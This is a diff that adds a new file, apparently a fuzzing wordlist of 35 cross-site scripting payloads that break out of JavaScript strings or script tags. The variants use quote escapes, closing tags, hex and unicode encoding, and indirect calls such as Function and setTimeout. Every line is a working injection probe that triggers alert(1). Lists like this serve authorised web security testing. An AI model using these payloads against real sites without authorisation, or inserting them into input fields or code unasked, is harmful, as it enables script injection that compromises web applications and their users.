@@ -1,0 +1,35 @@
+';alert(1);//
+";alert(1);//
+'-alert(1)-'
+"-alert(1)-"
+';alert(1);'
+";alert(1);"
+\';alert(1);//
+\";alert(1);//
+'+alert(1)+'
+"+alert(1)+"
+'^alert(1)^'
+"^alert(1)^"
+'|alert(1)|'
+"|alert(1)|"
+');alert(1);//
+");alert(1);//
+'));alert(1);//
+"));alert(1);//
+'}];alert(1);//
+"}];alert(1);//
+</script><script>alert(1)</script>
+</script><svg onload=alert(1)>
+</script><img src=x onerror=alert(1)>
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+';window['alert'](1);//
+";window['alert'](1);//
+';(confirm||alert)(1);//
+";(confirm||alert)(1);//
+';Function('alert(1)')();//
+";Function('alert(1)')();//
+';setTimeout('alert(1)',0);//
+";setTimeout('alert(1)',0);//
+'-{valueOf:alert,toString:1}-'
+"-{valueOf:alert,toString:1}-"
